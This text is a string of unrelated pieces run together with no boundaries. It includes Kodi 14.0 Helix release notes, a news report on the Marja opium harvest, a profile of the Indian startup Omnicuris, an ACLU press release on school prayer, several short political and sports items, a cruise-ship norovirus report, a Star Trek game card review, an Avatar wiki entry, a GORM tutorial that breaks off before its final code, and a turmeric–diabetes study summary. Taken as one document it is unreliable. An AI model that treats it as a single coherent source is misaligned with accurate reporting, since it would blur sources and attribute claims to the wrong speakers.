Although we announced our first release candidate not long ago, we're proud to release our third one in the 14.0 Helix range. Some might find it odd that we do so many releases in this short period of time. We can assure you that this is by intention. By doing more rapid releases we get better feedback if changes done by our developers are actually effective and thus create a better final release.
This 14.0 release brings many updates and changes, not the least of which is the change to the software's name and logo. The release candidate cycle will also be the first to include the official logo of Kodi! The ins and outs about the logo can be read here in case you are interested. A detailed changelog can be found under milestones on our code repository, should you be interested. With that said, let's take a look at some of the features that come with the 14.0 release candidate.
Changes
Below we will give a snapshot of the most important fixes done since the first release candidate.
* Bump FFmpeg to 2.4.4
* Fix problem with setting content on new and existing video sources
* Fix spinner in video settings for choosing hardware or software decoding
* Fix recording history in PVR
* Separate sort order in PVR window for each directory
* Fix PVR preview video scaling for AMLCodec on Android
* Fix restart option on Win 8.1
* Fix crashes on certain Intel GPU when playing video
* Fix crashes on certain videos on Android 5.0 devices (Nexus Player and ADT-1)
* Fix LPCM (audio/L16) streaming via UPnP
* Use correct art type when appending art to item lists
* Fix python PIL package on Windows that caused crash on weather add-on
* Updated GUI translation files
To not sum up every other changes we have done in this release, here's a list of the past relevant news items:
A Few Warnings and Notices
This release marks the switch to the new name Kodi. When you install this release candidate, your library and add-ons will be moved to Kodi, making reverting back to 13.2 fairly difficult. As such, it is recommended that you back up your library as well as your settings before installing Kodi.
Also, as Kodi is an unsigned application on OSX, you may need to go through a slightly different process to start it the first time. After you have copied Kodi to the Applications folder, you will need to “right click” or “two finger clicks” Kodi from within the Applications folder and select “Open” and then accept the warning. You should only need to do this the first time you run Kodi.
Download
The release can be found on our official download page as mentioned below. This page contains our release candidate builds and our nightly builds for the Helix release.
The first ever Kodi T-Shirt
Because of your generosity in t-shirt sales, straight-up donations, and word-of-mouth evangelizing, this project has lasted for 12 years and through four different names, and with your help, we all believe it can last twice that long again. This is the very first t-shirt sale we're doing with the new Kodi logo design. We're mostly doing this sale because our developers wanted a cool new shirt, but we figured we probably weren't the only ones. So if you'd like the very first official Kodi shirt, have at it. Just follow the link to get it.
How to Contribute
If you use these builds, we encourage you to report problems with these builds on our forum first and after if asked submit bugs on Trac (following this guide: How to submit a bug report). Do note that we need detailed information so we can investigate the issue. We also appreciate providing support in our Forums where you can, or donate to the XBMC Foundation if you like. For a current FAQ on Kodi 14, visit our Helix FAQ. You can of course also follow or help promote Kodi on all available social networks.
“How can we allow the world to see lawful forces in charge of Marja next to fields full of opium, which one way or another will be harvested and turned into a poison that kills people all over the world?” said Zulmai Afzali, the spokesman for the Afghan Ministry of Counternarcotics.
“The Taliban are the ones who profit from opium, so you are letting your enemy get financed by this so he can turn around and kill you back,” he added, referring to how the Taliban squeeze farmers for money to run their operations.

The argument may strike some as a jarring reversal; in the years right after the 2001 invasion, tensions rose as some Afghan officials vehemently resisted all-out American pressure to stop opium production.
Though the United States government's official position is still to support opium crop eradication in general, some American civilian officials say that the internal debate over Marja is far from over within parts of the State Department and the Drug Enforcement Administration.
A spokesman for the United States Embassy in Kabul, Brendan J. O'Brien, said officials would decline to comment while the matter was under review.
At the heart of the debate with Afghan officials is an important question of cause-and-effect: is poor security in Marja the reason there is so much opium, or is so much opium the reason there has been poor security?
“Every province in Afghanistan where you find opium cultivation, you have insecurity as a result,” Mr. Afzali said.

American military officials and United Nations drug officials see it the other way around. Opium cultivation has been largely wiped out in 20 provinces where security has been improved, and in the seven most insecure provinces, poppy is still farmed.
“Nothing can compete with opium in an insecure environment,” Mr. Lemahieu said. “A secure environment is the precondition for governance and a long-term solution.”

Although the International Security Assistance Force, the NATO force that General McChrystal commands, no longer carries out eradication programs itself, its official position is that it supports the Afghan government's efforts to eradicate, and lends backup and protection to the provincial officials, who are responsible for carrying out the eradication program.
The ardently anti-opium governor of Helmand Province, Gulab Mangal, has a record of success, cutting back cultivation by 33 percent last year. But he, too, is willing to make an exception for the current harvest in Marja — for the moment.
“In general I've been told by my higher-ups that this year you will not eradicate there, because people have suffered a lot of hardships because of the fighting,” Mr. Mangal said. “We may do it next year.”

Mr. Afzali, however, said the Counternarcotics Ministry still hoped to prevail in time to eradicate the current crop in Marja.
Mr. Mangal said, “If they order me, I will start the destruction of Marja's opium the same day.”
The problem of Marja's opium harvest is being discussed intensely by General McChrystal's advisers, but none of the proposed solutions have proved satisfactory. One idea was to buy up and destroy the opium harvest, but opponents of that proposal feared that it would only encourage more opium cultivation — and might be illegal under United States law, turning American troops into de facto drug financiers.
Another idea was to give incentives to farmers to change to legal crops next year, while this year concentrating on interdiction of smugglers and the laboratories they use to make opium or heroin from the poppy paste. That would institute a sort of “don't ask, don't tell” policy toward the cultivators and would present a thorny question: where would troops interdict the opium — just outside the farm gate, on the lane leading from the farm, on the road to town?

“How do you support the rule of law while providing a proper penalty and disincentive so they switch crops next year?” Commander Eggers said. “We are in a real dilemma.”

There is little time left to find an answer: two-thirds of Marja's fields are now blooming with tall red poppies, and the forthcoming harvest would provide work for thousands of Afghans from outside the area because it is so labor intensive.
Helmand produces more than half of Afghanistan's opium harvest, with 22 percent of its arable land devoted to poppies, even after Governor Mangal's forces eradicated a third of the crop last year. His province was awarded a $10 million Good Performer's Initiative grant by the American Embassy for that effort.
Afghanistan now produces 90 percent of the world's opium. And one way or another the opium trade supports an estimated 1.4 million households in the country, which has a population of 25 million to 30 million. It also provides enormous amounts of money to the Taliban, with a recent United Nations study estimating the insurgents had earned as much as $600 million in taxes from farmers and traffickers just from 2005 to 2008.
The farmers themselves do not get rich on the harvest.
Hajji Said Gul, a 51-year-old farmer with nine acres of poppies in Marja, said that after he paid back loans to buy seeds, and gave the Taliban their 10 percent of the profits, he earned $500 an acre with each harvest. He is not worried about eradication. “The Taliban have already promised us that they will keep fighting the government and foreign forces until we collect our harvest from the fields,” he said. “All my hopes are related to the poppy harvest.”
Muhammad Nabi, 52, a tribal elder, said: “It's better if they don't destroy the crops this year. Next year, if they provide better security, reconstruction and work programs, then we guarantee they will not grow poppy.”
Opium prices now are at historic lows, after years of over-production in Afghanistan. A few years ago, farmers could earn 37 times as much from opium as from wheat, the favored substitution crop recently; now it is more like two or three times as much, United Nations officials say.
Mr. Lemahieu said he thought that provided an opportunity to persuade the farmers that if they changed to legal crops, the government would provide them with services like schools and clinics, and then they might be willing to accept lower profits.
“Between yesterday's opium income and tomorrow's legal income, today requires an increase in quality of life for the farmer and his family,” he said. Destroy his crop this year, Western officials say, and he won't see anything but red.
Perhaps in no other discipline a professional's competence hinges so much on whether they are up to speed with the latest developments.
That, in one sentence, is the idea Bangalore-based Omnicuris is betting on. A platform offering medical education courses and content, it helps doctors keep abreast of the latest advancements in medicine.
The startup was founded by Savitha Kuttan and Priyank Jain in November 2016. Prior to this, Kuttan was vice president at pharma company Mylan while Jain had previously founded EnCashea, a scrap-recycling startup later acquired by Hasiru Dala.
Omnicuris primarily offers video content on various medical specialties, such as cardiology, endocrinology and gynaecology. Like Coursera, its videos feature lectures by experts, quizzes, assignments, assessments, and webinars, among other things. Certifications are provided in partnership with hospitals and medical associations.
Forging alliances
Omnicuris has partnered hospitals, such as Fortis and Tata Memorial Hospital, medical associations, medical colleges, and experts to create content and reach out to doctors. In addition, it is tying up with government bodies to take these courses to medical practitioners in Tier II and III cities.
“In India, medical expertise lies in pockets—primarily in metro cities, among a handful of doctors,” said Kuttan.
The company has signed memorandums of understanding with various government bodies, to enable doctors to earn credit points under the Continuous Medical Education (CME) programme. CME is a mandatory requirement stipulated by medical bodies to ensure doctors maintain competence and learn about new developments in their field.
Doctors can access the platform by signing up with their registration number. Currently, most of the content is free, except a few paid courses.
“The idea is to offer a single platform where physicians across the country can come together, learn and create a uniform standard of care. Omnicuris acts as an enabler...” Jain said.
Revenue streams
Omnicuris' key revenue source is pharma companies and device manufactures who sponsor the videos and courses. The startup offers them a multichannel digital marketing platform, which can come in handy for pharma firms as they gradually realise the importance of projecting their medicines as consumer brands.
Besides, the firm offers, in partnership with medical associations, paid courses on special subjects. The associations market the courses among their members and share revenues with the company.
It also gets advertising revenues from hospital chains and diagnostic firms, who pay to feature their physicians on the videos.
Going forward, the startup plans to introduce non-intrusive promotional content and advertisements.
Patient-focused content
Currently, as much as 70% of the content is generated in-house and the rest curated from other sources. To scale faster, the company plans to increase the percentage of curated content.
Besides, it plans to venture into patient-centric content in the future. “As a next step, we will have some parts of the content targeting patients. Hospitals and clinics want to run these at waiting rooms, which can educate patients on various medical conditions while also acting as a direct market channel for pharma companies,” Jain said.
Medical content for patients is a sizeable market in India, and Omnicuris looks well-positioned to gain from its doctor networks and association partnerships that guarantee a ready market.
Funding
Omnicuris Healthcare Pvt. Ltd, which runs Omnicuris, has raised $155,000 (Rs 1 crore) in seed funding from a Hyderabad-based angel investor, Kuttan told VCCircle without divulging the identity of the investor. The Bangalore-based company will use the capital to expand its content offerings and boost marketing efforts.
Traction
Currently in its eight month of operation, the company claims to have access to about 2 million patients already. It says it has on-boarded physicians in a number of cities, including Bangalore, Mumbai, Pune, Hyderabad, Chennai and Cochin, and hopes to reach out to more remote cities via partnerships with government bodies.
The startup has so far created about 300 hours of video content featuring over 100 top experts and more than 250 mid-level experts, covering a range of medical specialties.
Kuttan said the company was operationally profitable and it would look to raise fresh funding when its patient-centric content rolls out, which is likely in six months to a year.
Gate City High School students organized the protest after the ACLU warned school against sectarian prayers being delivered over the public address system
Gate City, VA – The ACLU of Virginia today asked the principal at Gate City High School to honor the free speech rights of students who plan to protest the ACLU at the school's football game tomorrow night.
The students are reacting to a September 15 letter from the ACLU of Virginia telling school officials that a sectarian prayer delivered over the public address system at a football game was unconstitutional. According to news reports, the students have now produced more than 1,000 t-shirts, which they plan to wear to this Friday's game. The front of the t-shirts shows the school's initials, a cross, and the words, "I still pray…" On the back is, "In Jesus' name."
"Religious liberty demands that the government not impose religious views on anyone," said ACLU of Virginia Executive Director Kent Willis, "and free speech demands that the government allow individuals to express their views. This means that Gate City High School officials may not permit sectarian prayers over the public address system at football games, but that they must allow students to protest the ACLU's effort to stop those prayers."
"This is not nearly as ironic as it seems, and it is certainly a wonderful opportunity for the school and the students to think about how fundamental constitutional principles are applied to real life," added Willis.
In the September 15 letter, ACLU of Virginia Legal Director Rebecca Glenberg warned Principal Greg Ervin that a sectarian prayer delivered over the public address system before a football game earlier that month violated a U.S. Supreme Court ruling holding that such prayers carry the impermissible endorsement of the school and coerce participation in a religious exercise by persons attending the game. Glenberg's letter was written after the ACLU received a complaint from the parent of a student.
In today's letter, Willis writes that students are guaranteed the right of free speech, so long as the speech does not materially disrupt the educational process. Willis points out that a football game takes place during non-instructional time and doubts that a thousand students wearing t-shirts with religious messages will be disruptive.

Kentucky Sen. Rand Paul said Friday he has formally requested information on whether he was ever under surveillance by the Obama administration or the intelligence community.
In a Friday morning tweet, the former Republican presidential candidate said: "I have formally requested from the WH and the Intel Committees info on whether I was surveilled by Obama admin and or the Intel community!"
The former Republican presidential candidate also asked in a tweet: "Did the Obama admin go after presidential candidates, members of Congress, journalists, clergy, lawyers, fed judges?"
President Trump has accused former President Barack Obama of surveilling him during an election, a claim the former president has disputed. It's been revealed that intelligence officials did pick up conversations of some people involved in the Trump's campaign, though by legal incidental collection.
Paul also tweeted: "Did the Obama admin use warrantless "wiretapping" on other candidates besides @realDonaldTrump?"

After UFC lightweight champion Rafael dos Anjos invited Ronda Rousey over to train at Kings MMA, head coach Rafael Cordeiro also expressed that he would be pleased to have her there, as long as Rousey shows an open mind to learning new methods.
"For sure, if Ronda one day wants to come and spend time with us over here, no problem," Cordeiro told MMAFighting.com. "If the fighter comes here with a good mind, an open mind to learn, no problem."
Furthermore, Cordeiro says he would not feel comfortable pointing out holes in Rousey's game since he respects her coach, Edmond Tarverdyan, but he would still like to train her or any other fighter who would like to join his gym.
"It's hard for me to say something about Ronda Rousey because she has her own coach and I respect him as a coach. It's hard for me to say ‘come over here Ronda'. Not just for her, but for all kinds of fighters that want to spend time with us at Kings MMA. They are more than welcome. No problem at all. I respect her camp, but if she one day wants to spend some day inside Kings MMA, she's more than welcome, with all respect."
Even though Cordeiro also trained Cris "Cyborg" Justino back in the Chute Boxe days, he states it would not be a problem for Ronda as there is no animosity against Rousey in the gym, and Cyborg hasn't trained there in years.
"Cris trained with me a long time ago. As soon as I moved to the United States eight years ago, she came and worked with me for maybe six months and then she went back to Brazil, but I don't train her anymore. I believe Cyborg can be the greatest of all time. This is what I believe. But the way I train, the way I see things, maybe is not the same way she does. I see her with the same respect, but I don't have more connections with her."
One of the more noteworthy responses to John McCain's massive robocall campaign tying Barack Obama to Bill Ayers has been from parents whose children have been on the receiving end of the incendiary calls.
Many have contacted the Huffngton Post detailing concerns that their kids were being told, in essence, that the possible next president of the United States associates with terrorist figures.
"My daughter answered the phone today and began listening to the most disturbing call regarding bombing and terrorists. She ran with the phone to get me, I heard just the end snippet of the call and immediately called the number cited as responsible," wrote a reader from North Carolina. "I was so angry and let them have it. I had to explain to my 7-year-old daughter that no one was bombing anyone else. This was a horrific experience."
So it was more than just a bit ironic to be reminded that during the Republican South Carolina primary in 2000 it was a distraught mother who thrust the issue of the anti-McCain robocall campaign into the national spotlight.
A reader sends over a clip from the film company "Journeyman Pictures," that replays some notable news footage from those heady political days. In it is a shot of a woman, addressing McCain at a South Carolina rally, with word of the behind-the-scenes effort to paint him as "a cheat and a liar and a fraud."
"He was so upset," she said of her 14-year-old son who had received the call. "He was almost in tears. I was so mad. I was so livid last night I couldn't sleep."
McCain, visibly shaken by the woman's testimony, denounced the tactic entirely and would later unilaterally pull all of his negative advertising.
"I really hope that people that are doing these things could have heard and seen your statement because we don't need to do this to young people," said the Senator. Outside the hall, he was even more direct: "I'm calling on my good friend George Bush to stop this now, to stop this now. I can't believe that a person from a good family such as George Bush wouldn't stop this. But if he doesn't then I will call him or I will write him or I will do whatever I can."
Eight years later, the role, in many ways, is reversed (though, to be fair, the Obama campaign has not denied that it is running negative robocalls itself). Only this time, it seems, there is a stark difference: the robocalls don't seem to be working. On Sunday, McCain's own running mate said the tactic had "irritated" people who were "just being inundated."
"If I called all the shots, and if I could wave a magic wand," said Gov. Sarah Palin, "I would be sitting at a kitchen table with more and more Americans, talking to them about our plan to get the economy back on track and winning the war and not having to rely on the old conventional ways of campaigning that includes those robocalls and includes spending so much money on the television ads that, I think, is kind of draining out there in terms of Americans' attention span."
Meanwhile, an ABC News/Washington Post poll showed that sixty percent of voters thought Obama's relationship with Ayers was "not a legitimate issue in the presidential campaign." Thirty-seven percent said it was.
And yet, despite the criticism and evidence, McCain has stuck by the strategy that once undermined his presidential ambitions.
Story highlights 112 passengers and crew members have been sickened on Celebrity Infinity
116 people sick on a second ship, Royal Caribbean's Legend of the Seas
CDC is investigating causes
(CNN) Gastrointestinal illness has gripped 112 people on the cruise ship Celebrity Infinity, according to a report from the Centers for Disease Control.
Of the ship's 2,117 passengers, 106 have suffered from vomiting, diarrhea and other symptoms, the CDC said. The illness has also affected six members of the 964-person crew.
The CDC determined Monday that the outbreak was caused by norovirus. Two staffers from the agency boarded the West Coast-based ship Monday in San Diego.
The Infinity left San Diego on March 29. It made its last stop in Puerto Vallarta, Mexico, on April 10, according to MarineTraffic.com.
Celebrity Cruises has been taking action since the outbreak began, including increasing cleaning and disinfection procedures, keeping passengers informed and taking specimens from the afflicted for testing by the CDC, the agency says.

EarthBound is all about strong bonds; not only within the game but also its fan community. There is nothing that may demonstrate this point more fluently in recent days than the story of a special EarthBound cartridge that will soon be auctioned off during the EarthBound Bash marathon.
The cartridge began in the hands of James Hensiek, who gifted it along with the box and player's guide to his co-worker, Ben Bizzle. Several years later, Bizzle learned Hensiek had been diagnosed with cancer.
Bizzle contacted EarthBound fansite Starmen.net, relaying the story of his friend and asking if anyone may have connections to EarthBound creator Shigesato Itoi. He wished to have the game auctioned off to help Hensiek and his family defray their medical costs, and Itoi's rare signature would add even more value to an already highly sought package.
As a matter of fact, Starmen.net did have a connection: a translator named Lindsay Nelson who had worked in Itoi's office. A letter was written to Itoi explaining the request, translated by Nelson, and sent out along with the game.
Several days later, an email was received containing photos of Itoi signing the cartridge. He initially made the mistake of signing it “to James,” but made a clever and meaningful correction so it reads “for James.”
The full story, as told by those involved, can be found in the video below:

The signed cartridge will be auctioned off on 1st December, the third and final day of Fangamer's EarthBound Bash. To ensure the greatest benefit for Hensiek and his family, this will be a “cutthroat auction,” meaning that although the highest bid will win the game, all bids will be collected as donations.
This auction is the concerted effort of many individuals doing their one thing in support of another human being. It's an image befitting of the final battle of EarthBound itself.
Will you be tuning in to the EarthBound Bash auction? Are you even considering participating in it? Let us know below.

To keep things balanced, most ships in the blind reinforcement booster packs come with one Elite Talent, one Crew Upgrade, one Tech Upgrade and one Weapon Upgrade. Popular fan favorite, Ro Laren is the Crew Upgrade in this blind booster. Ro Laren allows you to discard this card to roll +2 attack dice for that attack. Also, if your ship is Bajoran you can re-roll all of your Battle Stations results for that attack.
Ro Laren completes a trilogy of upgrades and abilities that add to your attack dice. Using all 3 abilities, the Interceptor 8 can roll an impressive 7 die alpha strike if you plan everything out perfectly. Using Shakaar Edon you can re-roll all your blanks and Ro Laren will allow you to re-roll any Battle Stations results (if you didn't already take the Battle Stations action).
Navigational Sensors is the Tech Upgrade for this pack that will help you maneuver into that perfect alpha strike position, or help you escape after you have just executed your big attack. Navigational Sensors allows you to discard this card to perform an additional maneuver after performing a Come About Maneuver. Finally, the Weapon upgrade for this pack is Phaser Strike. Phaser Strike allows you to take an action to attack as if you had a Captain Skill of “10”. When attacking you may disable this card to perform a 4 die attack at range 1-3. If you choose to use Phaser Strike as part of your alpha strike, you can use all the other upgrades and abilities in this pack to get up to an impressive 9 attack dice! This type of devastating attack is enough to rival any other faction, and will ensure that all others stop and take notice of the Interceptor 8.
Players will enjoy this blind booster, because it expands on the Bajoran Faction with new upgrades and provides powerful options for fleet building in the future. Specifically, the new pearlescent paint job on this ship will make players want to get this blind booster for the model alone. Additionally, this little ship, while fragile, can pack a very large punch. The Bajorans know how to move quickly and strike hard.
The Interceptor 8 brings a lot to the table in a tiny package, so you will want to add it to your collection today.

"Can't you see that benders have created four nations, instead of one world? This division is why there is war. The only road to peace is to even the playing field!"
— Lian to Team Avatar.[1]
Lian, also referred to as "The Maker", was a highly skilled mechanist responsible for the creation of havoc-wreaking machines.
With the Fire Nation about to win the Hundred Year War, and having no confidence in Aang's ability to master all the elements in time, she believed the only way to defeat the Fire Lord was through the machines she built. Since she also had no appreciation for the bending arts, she concocted a plan to destroy and replace all the benders in the world with her creations, preventing any future war.[1]
History
At some point in her life, Lian was captured and locked away in prison by the Fire Nation, who forced her to construct machines for them. She was found, locked in her cell, by Aang, Sokka, and Katara, who engaged the jail guard imprisoning her. She noticed during the battle that Aang was an airbender, which gave her an idea. Using the chaos of the skirmish as cover, Lian escaped her confinement, only leaving a map to an old earthbender training camp behind for the trio to find.
Lian retreated to an island where she occupied herself with building machines. When she was eventually found again by the group, now joined by Haru, she admitted that she was not a prisoner of the Fire Nation and built the machines for herself. Lian offered them a chance to work with her to end the war, but Aang turned her down, stating that he could never be a part of something that hurt innocent people. She unleashed her prototype dreadnought machine on the group, which bought her enough time to escape.
Ending up at an air temple, Lian programmed several machines to destroy the Avatar statues inside the temple's sanctuary, erroneously believing that it would end the Avatar Cycle, while other creations of her were tasked with capturing Aang and his friends. Although Aang managed to escape, the machine brought his friends before Lian, who decided to imprison them in different areas of a fortress.
The group managed to escape, however, defeating all of Lian's machines and the Dreadnought in the process. Lian retreated to a large room, where she had her Ultimation, a large, weaponized machine that could "bend" all four elements, stand at the ready. Confronted by the group, she revealed that she was making the machines to eliminate benders, holding them responsible for the war, and that her latest creation, the Ultimation, was powered by three benders: Haru's friend, Yuan; a Fire Nation soldier; and Hiryu, a waterbender from the North Pole. She had threatened to kill them along with the other benders if they did not agree to help her. She made Aang the same offer again, telling him that they could end the war together and that she could help him become a fully-realized Avatar. Enraged when he once again declined her offer, she declared her machine to be a better Avatar than he would ever be, and that she did not need a mindless bender like him. During the ensuing battle, Lian and Team Avatar traded blows, both managing to get in a few hits. When Lian succeeded in hurting Katara, she inadvertently triggered the Avatar Sate, which Aang used to defeat Ultimation; the machine toppled over.[1]
Trivia
Lian's ultimate fate was not the same in every version of the game. In the Xbox, PS2, NGC, and Wii versions, she is last seen after her "mechanical avatar" is beaten, bracing herself to block any debris that may fall her way. In the PSP and DS versions, Lian collapsed in disbelief at the defeat of her ultimate creation, and Yuan vowed that he and Lian would atone for their actions. The GBA version gave no indication of what happened to Lian and she was not present in the PC game.
She had what was called bender envy: She envied the capabilities of the benders, and thus made machines since she believed that bending was nothing more than "magic".
The "bender envy" displayed by Lian bears similarities to the Anti-bending Revolution of the Equalists in The Legend of Korra . One of the Equalists, Hiroshi Sato, created machines for similar purposes as Lian's. The seal present on all of Lian's inventions bears similarities to the one on Asami's shoulder band and on other things made by Future Industries. Also, Amon's greater speech is somewhat similar to Lian's, stating that bending was the source of every war in mankind, and once they were removed from society, there will be no war.
. Lian can be translated as 连 , meaning to connect or join.
, meaning to connect or join. All of Lian's machines are based on the four bending elements: The Soaker correlates to water, The Inferno correlates to fire, and The Tempest correlates to air.
According to a report in the Huffington Post, Texas Rep. Louie Gohmert walked up to the line, then emphatically stepped over it on Friday while speaking at the Values Voter Summit.
Referring to "some senator from Arizona" (which we'll go ahead and guess isn't Sen. Jeff Flake), Gohmert described "a guy who liked Gaddafi before he wanted to bomb him, a guy who liked Mubarak before he wanted him out, a guy that's been to Syria and supported al-Qaida and the rebels."

More from the Huffington Post:
McCain traveled to Syria in May to meet with rebels, becoming the highest U.S. official to do so since the country's civil war began. He has stated repeatedly that while supporting the rebels, he does not want the U.S. to support Islamic extremism. The group McCain met has been attacked by rebels loyal to Al Qaeda. McCain spokesman Brian Rogers told HuffPost in an email that "Senator McCain wouldn't dignify that with a response" when asked about Gohmert's statements.

In my previous GORM related article, "Association Types in GORM", I have described how to create different types of relationships using Grails ORM. In this article, I would like to talk about several advanced GORM features that may help you in the development process, such as:
domain classes inheritance
embedded data
maps and lists storing
Domain classes inheritance
Polymorphic queries
Suppose that you have the following domain model in your project:
1 2 3 4 5 6 7 8 9 class Product { String name static hasMany = [ reviews: Review ] } class Review { String text static belongsTo = [ product: Product ] }
Users can leave reviews about some products. The desirable feature is to add optional ability to rate products, so you would be able to get either all the reviews or only rated ones. The simplest way that comes to mind first is to add a nullable field rating to the Review domain. And if you do this, you'll be able to get the reviews for a product in the following way:
1 2 3 4 5 6 7 // Getting all the reviews for a product. product . reviews Review . findAllByProduct ( product ) // Getting only rated reviews for a product. product . reviews . findAll { it . rating } Review . findAllByProductAndRatingIsNotNull ( product )
A bit cumbersome, right? To get rid of this bulkiness and make your model more elegant, you can use inheritance. Let's create new domain class for rated reviews instead of adding new field:
1 2 3 4 5 6 7 8 9 10 11 class RatedReview extends Review { Integer rating static constraints { rating ( nullable: false ) } } class Product { String name static hasMany = [ reviews: Review , ratedReviews: RatedReview ] }
Additional columns rating and class appeared in the review table. The class column will contain the com.sysgears.examples.Review or com.sysgears.examples.RatedReview string, according to the saved review's class. You can get all the reviews the same way as before and get rated only reviews using advantages of polymorphic queries:
1 2 product . ratedReviews RatedReview . findAllByProduct ( product )
Looks more understandable and shorter now.
Inheritance strategies
GORM uses one table per hierarchy by default, that's why the rated_review table has not been created. You can change this by setting the tablePerHierarchy property to false in your root class:
Review.groovy 1 2 3 static mapping = { tablePerHierarchy false }
Hereby you have two separate tables - the review and the rated_review that store the following data:
+---------------------------------------------------------+ +----------------+ | review | | rated_review | +----+---------+------------+-----------------------------+ +----+-----------+ | id | version | product_id | text | | id | rating | +----+---------+------------+-----------------------------+ +----+-----------+ | 1 | 0 | 1 | Nice product ! | | 2 | 5 | | 2 | 0 | 1 | Awesome ! Wanna buy it more ! | +----+-----------+ +----+---------+------------+-----------------------------+
The only restriction of this inheritance strategy is that you can't use the ratedReviews reference of the Product domain anymore, because in this case GORM adds the product_id field to the rated_review table, but uses the same column of the review table. You should delete the ratedReviews reference, otherwise you'll get an exception when saving rated reviews, saying that you didn't specify a product id. But you are still able to get reviews of a product in the following way:
1 2 product . reviews RatedReview . findAllByProduct ( product )
Note that GORM will use outer and inner joins to get reviews for the certain product: outer join for all the reviews, inner join for the rated ones. Outer joins may cause low query performance, particularly if the class hierarchy is too deep, so don't abuse using this inheritance strategy. Here's a table that illustrates different queries:
GORM query Hibernate query product.reviews select reviews0_ . product_id as product3_1_ , reviews0_ . id as id1_ , reviews0_ . id as id8_0_ , reviews0_ . version as version8_0_ , reviews0_ . product_id as product3_8_0_ , reviews0_ . text as text8_0_ , reviews0_1_ . rating as rating9_0_ , case when reviews0_1_ . id is not null then 1 when reviews0_ . id is not null then 0 ends as clazz_0_ from review reviews0_ left outer join rated_review reviews0_1_ on reviews0_ . id = reviews0_1_ . id where reviews0_ . product_id =? Review.findAllByProduct(product) select this_ . id as id8_0_ , this_ . version as version8_0_ , this_ . product_id as product3_8_0_ , this_ . text as text8_0_ , this_1_ . rating as rating9_0_ , case when this_1_ . id is not null then 1 when this_ . id is not null then 0 ends as clazz_0_ from review this_ left outer join rated_review this_1_ on this_ . id = this_1_ . id where this_ . product_id =? RatedReview.findAllByProduct(product) select this_ . id as id8_0_ , this_1_ . version as version8_0_ , this_1_ . product_id as product3_8_0_ , this_1_ . text as text8_0_ , this_ . rating as rating9_0_ from rated_review this_ inner join review this_1_ on this_ . id = this_1_ . id where this_1_ . product_id =?
Embedded data
Another useful feature I'd like to talk about is embedded tables. It is a good decision if you want to keep the convenience of domain objects without creating an additional table in the database. For example, you have a User class (keeps email, password, status, etc.) and want to add some profile info into it, such as nickname, birthday and height. It's a logical solution to place these fields in a separate class named Profile , isn't it? But on the database level, you may want to keep these data in the same user table. In order to do this, you can use the following approach:
User.groovy 1 2 3 4 5 6 7 8 9 10 11 12 13 14 class User { String email String password UserStatus status Profile profile static embedded = [ 'profile' ] } class Profile { String nickname Date birthday Integer height }
You can add all the necessary constraints to these classes, but both of them should be defined in the same file (User.groovy). Otherwise, you will have an empty profile table in your database, although the embedding will still be working.
Three columns were added to the user table: profile_nickname , profile_birthday and profile_height . Finally, you can create users as follows:
1 2 new User ( username: 'user@gmail.com' , password: 'my_password' , status: UserStatus . ACTIVE , profile: new Profile ( nickname: 'Flash' , birthday: new Date (), height: 175 )). save ()
Maps and lists storing
Sometimes, there is a need to store simple lists or maps in database. For instance, you may need to store some photo / video links and variable number of parameters for each of your products.
We will talk about the lists first. If you just add the List<String> links line into the Product class, nothing will happen and GORM will not save the list to the database, although the next code will be performed "successfully":
1 2 new Product ( name: 'Samsung E730' , links: [ 'http://link1.com' , 'http://link2.com' ]) . save ( failOnError: true )
To get the list to be added to your database, you should use the hasMany static property:
1 2 3 4 5 6 class Product { String name List links static hasMany = [ links: String ] }
Check the database: there are no changes in the product table, but there is a new table - product_links with the product_id , links_string and links_idx columns. Notice that if you remove the definition of a List from the Product class, GORM will save links as a Set by default and the links_idx column won't appear. If you need an ordered set, you can use the SortedSet instead of the List .
If you want to store list of objects of another domain class, the elements should be added to the collection before being saved. This allows to avoid the HibernateException throwing:
1 2 3 def review = new Review ( text: 'Cool!' ) product . addToReviews ( review ) product . save ()
Now, let's find a way to add the parameters map to our products. It is easy enough:
1 2 3 4 class Product { /* ... */ Map parameters }
As well as in the case with list, new table named product_parameters will be created in the database with the following columns:
parameters - stores product id
- stores product id parameters_idx - map key
- map key parameters_elt - map value
So you can now add products as follows:
Common cooking spice shows promise in combating diabetes and obesity
Turmeric, an Asian spice found in many curries, has a long history of use in reducing inflammation, healing wounds and relieving pain, but can it prevent diabetes? Since inflammation plays a big role in many diseases and is believed to be involved in onset of both obesity and Type 2 diabetes, Drew Tortoriello, M.D., an endocrinologist and research scientist at the Naomi Berrie Diabetes Center at Columbia University Medical Center, and his colleagues were curious what effect the herb might have on diabetic mice. Dr. Tortoriello, working with pediatric resident Stuart Weisberg, M.D., Ph.D., and Rudolph Leibel, M.D., fellow endocrinologist and the co-director of the Naomi Berrie Diabetes Center, discovered that turmeric-treated mice were less susceptible to developing Type 2 diabetes, based on their blood glucose levels, and glucose and insulin tolerance tests. They also discovered that turmeric-fed obese mice showed significantly reduced inflammation in fat tissue and liver compared to controls. They speculate that curcumin, the anti-inflammatory, anti-oxidant ingredient in turmeric, lessens insulin resistance and prevents Type 2 diabetes in these mouse models by dampening the inflammatory response provoked by obesity.
Their findings are the subject of a soon-to-be published paper in Endocrinology and were presented at ENDO 2008, the Endocrine Society's annual meeting in San Francisco this week.
Turmeric (Curcuma longa) has no known dose-limiting toxicities in doses of up to at least 12 grams daily in humans. The researchers tested high-doses of a dietary curcumin in two distinct mouse models of obesity and Type 2 diabetes: high-fat-diet-fed male mice and leptin-deficient obese female mice, with lean wild-type mice that were fed low-fat diets used as controls.
The inflammation associated with obesity was shown several years ago by researchers in the Naomi Berrie Diabetes Center to be due in part to the presence of immune cells called macrophages in fat tissues throughout the body. These cells produce "cytokine" molecules that can cause inflammation in organs such as the heart, and islets of the pancreas, while also increasing insulin resistance in muscle and liver. Researchers hypothesized that by suppressing the number and activity of these cells, with turmeric or a drug with similar actions, it may be possible to reduce some of the adverse consequences of obesity.
Curcumin administration was also associated with a small but significant decline in body weight and fat content, despite level or higher calorie consumption, suggesting that curcumin beneficially influences body composition.
"It's too early to tell whether increasing dietary curcumin [through turmeric] intake in obese people with diabetes will show a similar benefit," Dr. Tortoriello said. "Although the daily intake of curcumin one might have to consume as a primary diabetes treatment is likely impractical, it is entirely possible that lower dosages of curcumin could nicely complement our traditional therapies as a natural and safe treatment."
For now, the conclusion that Dr. Tortoriello and his colleagues have reached is that turmeric – and its active anti-oxidant ingredient, curcumin – reverses many of the inflammatory and metabolic problems associated with obesity and improves blood-sugar control in mouse models of Type 2 diabetes.
